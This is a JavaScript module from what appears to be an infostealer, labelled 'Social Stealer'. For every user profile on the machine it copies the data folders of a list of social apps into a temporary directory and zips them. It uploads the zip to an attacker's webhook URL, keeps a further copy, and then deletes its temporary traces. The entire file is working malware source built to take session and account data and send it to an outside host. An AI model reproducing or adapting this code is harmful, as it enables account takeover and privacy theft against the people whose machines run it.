const fs = require('fs');
const path = require('path');
const os = require('os');

const socialsPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

module.exports = async (webhookUrl) => {
  const users = await hardware.GetUsers();

  const socialsTempDir = path.join(os.tmpdir(), 'socials-temp');
  if (!fs.existsSync(socialsTempDir)) {
    fs.mkdirSync(socialsTempDir, { recursive: true });
  }

  let socialsFound = '';

  for (const user of users) {
    for (const [name, relativePath] of Object.entries(socialsPaths.GetSocials())) {
      const socialsPath = path.join(user, relativePath);

      if (!fs.existsSync(socialsPath) || !fs.lstatSync(socialsPath).isDirectory()) {
        continue;
      }

      try {
        const socialsDestPath = path.join(socialsTempDir, user.split(path.sep)[2], name);
        await fileutil.Copy(socialsPath, socialsDestPath);
        socialsFound += `\n✅ ${user.split(path.sep)[2]} - ${name}`;
      } catch (err) {
        continue;
      }
    }
  }

  if (socialsFound === '') {
    return;
  }

  if (socialsFound.length > 4090) {
    socialsFound = 'Numerous social to explore.';
  }

  const socialsTempZip = path.join(os.tmpdir(), 'socials.zip');
  try {
    await fileutil.ZipDirectory({
      inputDir: socialsTempDir,
      outputZip: socialsTempZip,
    });

    await requests.Webhook(
      webhookUrl,
      {
        embeds: [
          {
            title: 'Social Stealer',
            description: '```' + socialsFound + '```',
          },
        ],
      },
      [socialsTempZip]
    );

    const WishTempDir = fileutil.WishTempDir('socials');
    await fileutil.Copy(socialsTempDir, WishTempDir);

    [socialsTempDir, socialsTempZip].forEach(async (dir) => {
      await fileutil.RemoveDir(dir);
    });
  } catch (error) {
    console.error(error);
  }
};
